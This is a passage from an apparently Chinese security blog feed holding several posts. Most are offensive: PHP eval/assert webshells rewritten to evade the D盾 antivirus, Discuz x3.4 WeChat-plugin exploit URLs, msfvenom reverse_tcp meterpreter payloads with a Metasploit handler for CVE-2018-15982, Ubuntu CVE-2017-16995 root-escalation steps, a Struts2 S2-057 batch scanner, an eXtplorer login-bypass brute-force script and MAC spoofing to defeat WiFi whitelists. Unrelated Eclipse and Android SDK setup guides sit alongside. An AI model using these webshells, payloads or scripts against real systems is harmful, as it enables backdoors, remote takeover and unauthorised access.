title="命令例子"></a>命令例子</h1><p>文件：<code>lib\command.py</code></p><ul><li>version</li></ul><pre><code class="python"># 版本号def command_version(self,*args, **kwargs):    Version = &quot;vserion: 0.01 \n&quot;    Color(Version,&quot;red&quot;)</code></pre><ul><li>exit</li></ul><pre><code class="python"># 退出def command_exit(self,*args, **kwargs):    Color(&quot;[-] Exit...&quot;,&quot;red&quot;)    exit(0)</code></pre><p><img src="/images/Python/POC%E6%A1%86%E6%9E%B6%E7%BC%96%E5%86%99/test.png" srcset="/img/loading.gif" alt=""></p><p>这里，只弄了两个最简易的例子，其他的，就请各位自己尝试编写看看</p><p>这个初次框架，尝试的是单例模式，可以根据各自的需要改成多线程模式！</p><hr><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p><img src="/images/Python/POC%E6%A1%86%E6%9E%B6%E7%BC%96%E5%86%99/POC.gif" srcset="/img/loading.gif" alt=""></p><p>一个框架的威力，取决于exp的数量与质量</p><p>但是，编写一个适合自己使用的框架，是在造灰机的过程中是必不可少的过程</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP传值方式绕过D盾</title>
    <link href="/2019/09/24/Web/PHP%E7%B1%BB%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87D%E7%9B%BE/"/>
    <url>/2019/09/24/Web/PHP%E7%B1%BB%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87D%E7%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>这两天因<code>phpstudy</code>后门事件，郁闷的不行，用了这么久都没有发现。。。吓得我直接扔虚拟机了</p><p>啥都不会的我，只能拿D盾压压惊（其实是因为早就写好的绕过<code>一片红</code>，全部被加进了规则库）</p><p>现在网上流传的工具，开始逐渐的被各种杀软所识别，渐渐失效</p><p>各自研究的武器，都在各自的手里，我也没啥思路制作，总结：菜啊。。。</p><hr><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><ul><li>先来看看，被查杀的一句话</li></ul><pre><code class="php">class get{    public function setName($name){        return $this -&gt; name = $name;    }}$obj = new get();$s = $obj -&gt; setName(&quot;$_POST[1]&quot;);eval(null.$s);</code></pre><p><img src="/images/Web/php%E4%BC%A0%E5%80%BC%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87D%E7%9B%BE/1.png" srcset="/img/loading.gif" alt=""></p><ul><li><p>先来试试，改下这个一句话，看着参数，就想到传参方式</p><pre><code class="php">&lt;?phpclass get{    public function setName($name=1){        return $this -&gt; name = $name;    }}$obj = new get();$s = $obj -&gt; setName(&quot;$_POST[1]&quot;);eval($s);</code></pre></li></ul><p><img src="/images/Web/php%E4%BC%A0%E5%80%BC%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87D%E7%9B%BE/2.png" srcset="/img/loading.gif" alt=""></p><ul><li><p>再次进行绕过：在类方法中写参数的默认值，不足以绕过，我们再试试在调用的时候使用固定参数传值试试</p><pre><code class="php">&lt;?phpclass get{    public function setName($name=1){        return $this -&gt; name = $name;    }}$obj = new get();$s = $obj -&gt; setName($name=&quot;$_POST[1]&quot;);eval($s);</code></pre><p><img src="/images/Web/php%E4%BC%A0%E5%80%BC%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87D%E7%9B%BE/3.png" srcset="/img/loading.gif" alt=""></p></li></ul><p>使用Cknife连接看看<br><img src="/images/Web/php%E4%BC%A0%E5%80%BC%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87D%E7%9B%BE/4.png" srcset="/img/loading.gif" alt=""></p><p>连接成功，到此成功绕过D盾</p><blockquote><p>这里好像可以更简洁的，不过我复杂了。。。<br>经常看大佬各种加密混淆，而我却不会，只能走这些邪门外道了</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP一句话过D盾</title>
    <link href="/2019/08/19/Web/php%E4%B8%80%E5%8F%A5%E8%AF%9DD%E7%9B%BE/"/>
    <url>/2019/08/19/Web/php%E4%B8%80%E5%8F%A5%E8%AF%9DD%E7%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p>一个早期的webshell一句话，早就被查杀</p><pre><code class="php">&lt;?php    @eval($_POST[1]);?&gt;</code></pre><a id="more"></a><ul><li><p>进行混淆测试</p><pre><code class="php">// 第一次@&#39;&#39;.eval(&#39;&#39;.$_POST[1]); // 被杀</code></pre><p><img src="/images/Web/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%BF%87D%E7%9B%BE/1560841714481.png" srcset="/img/loading.gif" alt=""></p><pre><code class="php">// 第二次function nice($nice){    $a = eval($nice);    return $a;}@nice($_POST[1]);  // 被杀</code></pre><p><img src="/images/Web/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%BF%87D%E7%9B%BE/1560841672560.png" srcset="/img/loading.gif" alt=""></p><pre><code class="php">// 第三次function nice($p){    eval(&#39;&#39;.$p);}$p = &quot;$_POST[1]&quot;;nice($p); // 被杀</code></pre><p><img src="/images/Web/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%BF%87D%E7%9B%BE/1560842486148.png" srcset="/img/loading.gif" alt=""></p></li></ul><ul><li>总结</li></ul><p>经过了以上的两次测试，你可以发现</p><p>第一次，它检测了eval函数并读取了里面的类容</p><p>第二次，使用了方法并利用传参+return 返回，D盾显示<code>eval后门 $nice{未知内容} 可疑eval</code></p><p>第三次，只使用方法+传参的方法，并把参数用变量传递，显示<code>eval后门 函数内的内容无法识别</code></p><p>可以看到D盾是针对<code>eval()</code>函数和方法外部的变量带入进行检测的，对函数内容的检测</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><ul><li><p>在方法中对变量重复赋值：被杀</p><pre><code class="php">function nice($p){    $p = &quot;$_POST[2]&quot;;    eval(&#39;&#39;.$p);}$p = &quot;$_POST[1]&quot;;nice($p);</code></pre><p><img src="/images/Web/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%BF%87D%E7%9B%BE/1560843266779.png" srcset="/img/loading.gif" alt=""></p></li><li><p>对方法中变量进行多次赋值：绕过</p><pre><code class="php">function nice($p){    $a = $p;    eval(&#39;&#39;.$a);}$p = &quot;$_POST[1]&quot;;nice($p);</code></pre><p><img src="/images/Web/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%BF%87D%E7%9B%BE/1560843369564.png" srcset="/img/loading.gif" alt=""></p></li><li><p>在此基础上，你还可以把<code>eval</code>函数替换成<code>assert函数</code>：绕过</p><pre><code class="php">function nice($p){    $a = $p;    assert(&#39;&#39;.$a);}$p = &quot;$_POST[1]&quot;;nice($p);</code></pre><p><img src="/images/Web/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%BF%87D%E7%9B%BE/1560843725010.png" srcset="/img/loading.gif" alt=""></p></li></ul><p>当然你也可以使用其他的方式，对其进行fuzz，本人的表达能力不太好，各位大佬将就看看</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dz x3.4逻辑漏洞复现</title>
    <link href="/2019/08/19/%E6%BC%8F%E6%B4%9E/dz%20x3.4%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <url>/2019/08/19/%E6%BC%8F%E6%B4%9E/dz%20x3.4%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p><code>x3.4</code>，安装并开启了微信登录插件<br>原贴：<a href="https://www.sk15.net/archives/119.html?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://www.sk15.net/archives/119.html?tdsourcetag=s_pcqq_aiomsg</a></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code># 随机登陆一个账号，任意填写/plugin.php?id=wechat:wechat&amp;ac=wxregister&amp;username={username}# 清空tmp/plugin.php?id=wechat:wechat&amp;ac=unbindmp&amp;uid={uid}&amp;hash={csrf_hash}# 注册账号/plugin.php?id=wechat:wechat&amp;ac=wxregister&amp;username={username}&amp;wxopenid=abcdefg</code></pre><blockquote><p>登录之后会跳转到微信，然后回到首页刷新即可</p></blockquote><a id="more"></a><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p><img src="/images/%E6%BC%8F%E6%B4%9E/dz_x3.4/1.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E6%BC%8F%E6%B4%9E/dz_x3.4/2.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E6%BC%8F%E6%B4%9E/dz_x3.4/3.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2018-15982漏洞复现</title>
    <link href="/2019/08/19/%E6%BC%8F%E6%B4%9E/CVE-2018-15982/"/>
    <url>/2019/08/19/%E6%BC%8F%E6%B4%9E/CVE-2018-15982/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>当地时间12月5日,Adobe官方发布安全通告修复了两个漏洞,分别是Adobe Flash Player中的0day漏洞CVE-2018-15982Adobe和Flash Player installer中的高危</p><h1 id="捆绑监听"><a href="#捆绑监听" class="headerlink" title="捆绑监听"></a>捆绑监听</h1><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw &gt; 86.binmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw &gt; 64.binpython CVE-2018-15982.py -i 86.bin -I 64.bin -o apt.swf</code></pre><p><img src="/images/%E6%BC%8F%E6%B4%9E/CVE-2018-15982/0.jpg" srcset="/img/loading.gif" alt=""></p><p>生成为文件复制到<code>/var/www/html/</code>下<br>并开启<code>apache</code>服务</p><a id="more"></a><h1 id="MSF监听"><a href="#MSF监听" class="headerlink" title="MSF监听"></a>MSF监听</h1><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost IPset lport 4444exploit</code></pre><p>win7下浏览器访问</p><p><img src="/images/%E6%BC%8F%E6%B4%9E/CVE-2018-15982/1.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E6%BC%8F%E6%B4%9E/CVE-2018-15982/2.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubantu本地提权漏洞【CVE-2017-16995】</title>
    <link href="/2019/08/19/%E6%BC%8F%E6%B4%9E/Linux/CVE-2017-16995/"/>
    <url>/2019/08/19/%E6%BC%8F%E6%B4%9E/Linux/CVE-2017-16995/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Twitter上Nikolenko发推表示ubuntu最新版本存在一个本地提权漏洞，并且提供了EXP下载地址<br>该漏洞在老版本中已经完成修复，但是在ubuntu16.04版本依旧可以被利用。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>受影响版本: <code>4.14</code> - <code>4.4.0-103</code> 内核版本</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>把exp上传到拥有漏洞的Linux服务器</p><p>然后我们开始编译该文件</p><pre><code class="bash">gcc -o upstream44 upstream44.c</code></pre><p>得到可执行文件<code>upstream44</code></p><p>最后,执行刚刚编译后的文件</p><pre><code class="bash">./upstream44</code></pre><p>成功提升到<code>root权限</code></p><a id="more"></a><h1 id="漏洞缓解"><a href="#漏洞缓解" class="headerlink" title="漏洞缓解"></a>漏洞缓解</h1><p>通过修改内核参数来限制普通用户使用bpf(2)系统调用的方式以规避风险</p><pre><code class="bash">echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled</code></pre>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>St2-057漏洞复现</title>
    <link href="/2019/08/19/%E6%BC%8F%E6%B4%9E/St2-057/"/>
    <url>/2019/08/19/%E6%BC%8F%E6%B4%9E/St2-057/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行</p><p>url标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行</p><a id="more"></a><hr><h1 id="搭建漏洞环境"><a href="#搭建漏洞环境" class="headerlink" title="搭建漏洞环境"></a>搭建漏洞环境</h1><ul><li><p>克隆vulhub</p><pre><code>git clone https://github.com/vulhub/vulhubcd vulhub/struts2/s2-048docker-compose up -ddocker ps    </code></pre></li><li><p>进入docker<br><code>docker ps</code><br><img src="/images/%E6%BC%8F%E6%B4%9E/St2-057/dockerps.png" srcset="/img/loading.gif" alt=""></p></li></ul><pre><code>docker exec -i -t &lt;你上面显示的CONTAINER ID &gt; /bin/bash</code></pre><ul><li>根据公告（Struts 2.5.16存在s2-057漏洞，然后去下载这个版本）<blockquote><p>Tips：在wget步骤可能会有点久，可以让他自己下载，看下电影去。。</p></blockquote></li></ul><pre><code>apt-get update -ymkdir /usr/local/tomcat/webapps/testwget https://fossies.org/linux/www/legacy/struts-2.5.16-all.zipapt-get install unzip -yunzip struts-2.5.16-all.zipcp struts-2.5.16/apps/struts2-showcase.war  /usr/local/tomcat/webapps/</code></pre><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p><code>/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml</code><br><code>/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/src/java/struts-actionchaining.xml</code></p><p>修改为</p><pre><code>&lt;struts&gt;    &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;        &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;           &lt;result type=&quot;redirectAction&quot;&gt;             &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;           &lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;</code></pre><p>两处修改完之后，重启服务</p><pre><code>cd /usr/local/tomcat/bin/./shutdown.shdocker-compose up -d</code></pre><hr><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞利用大致分类</p><ul><li>数值计算<blockquote><p><code>${(100+200)}</code> 可以在指定URL处计算<br><a href="http://192.168.28.130:8080/struts2-showcase/${(100+200)}/actionChain1.action" target="_blank" rel="noopener">http://192.168.28.130:8080/struts2-showcase/${(100+200)}/actionChain1.action</a></p></blockquote></li><li>弹出计算器</li><li>命令回显</li></ul><p>在这里，我只成功了数值计算，其他两个据说要在低版本才能执行<br>有兴趣的小伙伴，可以自行尝试</p><p><img src="/images/%E6%BC%8F%E6%B4%9E/St2-057/1.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E6%BC%8F%E6%B4%9E/St2-057/2.png" srcset="/img/loading.gif" alt=""></p><h1 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h1><pre><code class="python">import requestsdef scan(host):    payload = &#39;${(100+200)}&#39;    urls = &#39;http://%s/struts2-showcase/&#39; % (host)    url = urls + payload + &#39;/actionChain1.action&#39;    com = urls + &#39;300/register2.action&#39;    headers = {&#39;user-aget&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#39;}    try:        r = requests.get(url,headers,timeout=10)        if r.url == com:            print(&#39;Please wait...&#39;)            print(&#39;[+] St2-057：&#39;+r.url)        else:            print(&#39;[-] Not St2-057&#39;)    except Exception as e:        print(&#39;[-] Error：&#39;+com)if __name__ == &#39;__main__&#39;:    file_path = input(&#39;Path：&#39;)    host = [i.rstrip(&#39;\n&#39;) for i in open(file_path, &#39;r&#39;) if i != &#39;\n&#39;]    for i in host:        scan(i)</code></pre><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/Ivan1ee/struts2-057-exp" target="_blank" rel="noopener">https://github.com/Ivan1ee/struts2-057-exp</a><br><a href="https://github.com/jas502n/St2-057/" target="_blank" rel="noopener">https://github.com/jas502n/St2-057/</a><br><a href="https://bbs.ichunqiu.com/thread-44733-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-44733-1-1.html</a><br><a href="https://422926799.github.io/2018/08/23/St2-057%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://422926799.github.io/2018/08/23/St2-057%E5%A4%8D%E7%8E%B0/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>explorer绕过密码验证复现</title>
    <link href="/2019/08/19/%E6%BC%8F%E6%B4%9E/eXtplorer/"/>
    <url>/2019/08/19/%E6%BC%8F%E6%B4%9E/eXtplorer/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>extplorer</code>是一个文件管理的CMS</p><p>原文：<a href="https://mp.weixin.qq.com/s?__biz=MzAxNjg0NzEzNQ==&mid=2247483912&idx=1&sn=85ed630544045a8f4c3aac26b173a5b0&chksm=9befda78ac98536ed73b99e285051febde434766566690fecadb86dd61a222f4e63ebe5993fe&mpshare=1&scene=23&srcid=1125hHhlPDcH8kVoXMI5MVlO#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/</a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>利用：post表单提交的时候把密码参数去掉，并确定该账户存在</p><p>感觉一个个猜太麻烦了，菜鸡的我写了一个简易脚本(写码三分钟，debug一整天)</p><a id="more"></a><pre><code class="python">import requestsimport json,os,timedef Blast(url,files):    print(&#39;[*] Version：2.1.9&#39;)    if files == &#39;&#39;:        file = []        file.append(&#39;admin&#39;)    else:        if os.path.exists(files) == True:            file = [i.strip(&#39;\n&#39;) for i in open(files,&#39;r&#39;) if i != &#39;&#39;]        else:            print(&#39;[-] The file does not exist.&#39;)            return 0    for i in file:        time.sleep(0.1)        payload = {            &#39;option&#39;: &#39;com_extplorer&#39;,            &#39;action&#39;: &#39;login&#39;,            &#39;type&#39;: &#39;extplorer&#39;,            &#39;username&#39;: i,            &#39;lang&#39;: &#39;simplified_chinese&#39;        }        try:            r = requests.post(url, headers=headers, data=payload)            rs = r.text.replace(&#39;\&#39;&#39;, &#39;&quot;&#39;)            result = json.loads(rs)            # print(result[&#39;success&#39;])            if result[&#39;success&#39;] == True:                print(&#39;[+] Username：&#39; + payload[&#39;username&#39;])        except Exception as e:            print(&#39;[-] The vulnerability does not exist&#39;)if __name__ == &#39;__main__&#39;:    headers = {        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0&#39;,        &#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;,        &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded; charset=UTF-8&#39;,        &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,        &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;,        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,    }    url = input(&#39;Url &gt; &#39;)    files = input(&#39;filename &gt; &#39;)    Blast(url,files)</code></pre><p><img src="/images/%E6%BC%8F%E6%B4%9E/explorer_cms/1.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E6%BC%8F%E6%B4%9E/explorer_cms/2.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Eclipse安装</title>
    <link href="/2019/08/19/Android/Android%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Eclipse%E5%AE%89%E8%A3%85/"/>
    <url>/2019/08/19/Android/Android%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Eclipse%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h2 id="下载Eclipse"><a href="#下载Eclipse" class="headerlink" title="下载Eclipse"></a>下载Eclipse</h2><p>Eclipse官方下载地址: <code>https://www.eclipse.org/downloads/eclipse-packages/</code><br>根据自己的需求选择不同的版本</p><a id="more"></a><p><img src="/images/Android/Eclipse%E5%AE%89%E8%A3%85/0.png" srcset="/img/loading.gif" alt=""></p><h2 id="下载JDK"><a href="#下载JDK" class="headerlink" title="下载JDK:"></a>下载JDK:</h2><p>JDK官方下载地址</p><blockquote><p><a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/index.html</a><br>推荐下载7.0或以上的版本<br>根据自己系统选择 32位 或 64位</p></blockquote><p><img src="/images/Android/Eclipse%E5%AE%89%E8%A3%85/1.png" srcset="/img/loading.gif" alt=""></p><h2 id="配置Java环境变量"><a href="#配置Java环境变量" class="headerlink" title="配置Java环境变量"></a>配置Java环境变量</h2><blockquote><p>我的电脑右键 - 高级系统设置 - 高级 - 环境变量</p></blockquote><p><img src="/images/Android/Eclipse%E5%AE%89%E8%A3%85/2.png" srcset="/img/loading.gif" alt=""></p><p>新建系统变量 - 变量名<code>Java_Home</code> - 指向的是JDK的安装路径<br>例如我的安装路径为:<code>D:\Program Files\Java\jdk1.8.0_161\bin\</code><br><img src="/images/Android/Eclipse%E5%AE%89%E8%A3%85/3.png" srcset="/img/loading.gif" alt=""></p><p>在<code>PATH</code>中修改,使他执行JDK的bin目录<br>添加<code>%JAVA_HOME%\bin</code><br><img src="/images/Android/Eclipse%E5%AE%89%E8%A3%85/4.png" srcset="/img/loading.gif" alt=""></p><p><code>CLASSPATH</code>环境变量放在最后面<br>是因为以后你出现的莫名其妙的怪问题<br>80%以上都可能是由于CLASSPATH设置不对引起的<br>所以要加倍小心才行</p><p>系统变量 - 新建 - 变量名<code>CLASSPATH</code> - 值<br><code>.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar</code><br><img src="/images/Android/Eclipse%E5%AE%89%E8%A3%85/5.png" srcset="/img/loading.gif" alt=""></p><p>配置完成后运行<code>javac</code>,<code>java -version</code>测试一下<br>以下表面配置成功<br><img src="/images/Android/Eclipse%E5%AE%89%E8%A3%85/6.png" srcset="/img/loading.gif" alt=""></p><h2 id="运行Eclipse"><a href="#运行Eclipse" class="headerlink" title="运行Eclipse"></a>运行Eclipse</h2><p>把我们下载的解压包解压对应文件夹即可<br><img src="/images/Android/Eclipse%E5%AE%89%E8%A3%85/7.png" srcset="/img/loading.gif" alt=""><br>双击<code>eclipse.exe</code>运行程序</p><p>运行成功<br><img src="/images/Android/Eclipse%E5%AE%89%E8%A3%85/8.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ADT + Android SDK</title>
    <link href="/2019/08/19/Android/Android%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ADT%E9%85%8D%E7%BD%AE/"/>
    <url>/2019/08/19/Android/Android%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ADT%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="ADT安装的两种方式"><a href="#ADT安装的两种方式" class="headerlink" title="ADT安装的两种方式"></a>ADT安装的两种方式</h2><h3 id="在eclipse的插件安装界面中通过在线安装"><a href="#在eclipse的插件安装界面中通过在线安装" class="headerlink" title="在eclipse的插件安装界面中通过在线安装"></a>在eclipse的插件安装界面中通过在线安装</h3><p>在线安装地址:<code>http://dl-ssl.google.com/androd/eclipse/</code></p><p>打开eclipse - help - install New Software</p><a id="more"></a><p><img src="/images/Android/ADT%E9%85%8D%E7%BD%AE/0.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Android/ADT%E9%85%8D%E7%BD%AE/1.png" srcset="/img/loading.gif" alt=""></p><p>我这网速不好就不在这继续往下演示了</p><p>在软件对话框中,选中”Developer Tools”复选框,然后点击”Next”<br>下一个窗口中，您会看到一个要下载的工具列表。单击“Next”<br>阅读并接受许可协议，然后单击“Finish”<br>安装完成后，重新启动Eclipse</p><h3 id="下载ADT压缩包-本地安装"><a href="#下载ADT压缩包-本地安装" class="headerlink" title="下载ADT压缩包,本地安装"></a>下载ADT压缩包,本地安装</h3><p>下载地址: <code>http://developer.android.com/sdk/installing/installing-adt.html</code></p><p>下载ADT离线解压包</p><p>打开eclipse - help - install New Software<br>单击 Add 按钮，在右上角<br>在”Add Repository”对话框，单击”Archive”<br>选择下载的adt-23.0.6.zip文件并单击”确认”<br>在Name(名称)处输入”ADT Plugin”,单击“Finish”<br>在软件对话框中,选中”Developer Tools”复选框,然后点击”Next”<br>下一个窗口中，您会看到一个要下载的工具列表。单击“Next”<br>阅读并接受许可协议，然后单击“Finish”<br>安装完成后，重新启动Eclipse<br><img src="/images/Android/ADT%E9%85%8D%E7%BD%AE/2.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Android/ADT%E9%85%8D%E7%BD%AE/3.png" srcset="/img/loading.gif" alt=""></p><p>如果安装很慢请把下图箭头处取消勾选<br><img src="/images/Android/ADT%E9%85%8D%E7%BD%AE/4.png" srcset="/img/loading.gif" alt=""></p><h2 id="Android-SDK"><a href="#Android-SDK" class="headerlink" title="Android SDK"></a>Android SDK</h2><p>下载地址: <a href="http://www.androiddevtools.cn/" target="_blank" rel="noopener">http://www.androiddevtools.cn/</a><br><img src="/images/Android/ADT%E9%85%8D%E7%BD%AE/5.png" srcset="/img/loading.gif" alt=""></p><p>下载好之后,对zip进行解压到目标路径</p><p>我们把sdk的目录指定到我们解压的路径<br><img src="/images/Android/ADT%E9%85%8D%E7%BD%AE/6.png" srcset="/img/loading.gif" alt=""></p><p><img src="/images/Android/ADT%E9%85%8D%E7%BD%AE/7.png" srcset="/img/loading.gif" alt=""></p><p>根据自己的需求进行下载，可能时间会比较长</p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>突破WIFI黑白名单限制</title>
    <link href="/2019/08/19/%E9%9A%8F%E6%89%8B%E8%AE%B0/%E7%AA%81%E7%A0%B4WIFI%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E9%99%90%E5%88%B6/"/>
    <url>/2019/08/19/%E9%9A%8F%E6%89%8B%E8%AE%B0/%E7%AA%81%E7%A0%B4WIFI%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="扯淡"><a href="#扯淡" class="headerlink" title="扯淡"></a>扯淡</h1><p>之前写了一个破解WIFI的，本来那天就应该写的，结果那个网卡不支持修改MAC地址</p><p>还搞了几天，还是没成功，最后网卡被我分尸了，感觉实在是受不了这委屈（特地另开一章）</p><p>盘他</p><a id="more"></a><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>根据大佬说的，新版本要需要关闭<code>NetworkManager</code>的MAC随机化设置</p><pre><code>leafpad /etc/NetworkManager/NetworkManager.conf# 添加如下设置[device]wifi.scan-rand-mac-address=no</code></pre><p>重启<code>NetworkManager</code></p><pre><code>sudo systemctl restart NetworkManager</code></pre><p>然后在软件端修改网卡的MAC地址</p><pre><code>ifconfig wlan0 down # 关闭该网卡ifconfig wlan0 hw ether [STATION] # 修改该网卡的MAC地址ifconfig wlan0 up # 激活该网卡</code></pre><p>最后进行连接就可以了</p><p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/WIFI/Mac.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>随手记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>无线电</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分析无字母数字一句话组合</title>
    <link href="/2019/08/19/Web/%E6%97%A0%E5%AD%97%E6%AF%8D%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%88%86%E6%9E%90/"/>
    <url>/2019/08/19/Web/%E6%97%A0%E5%AD%97%E6%AF%8D%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%88%86%E6%9E%90/</url>
    
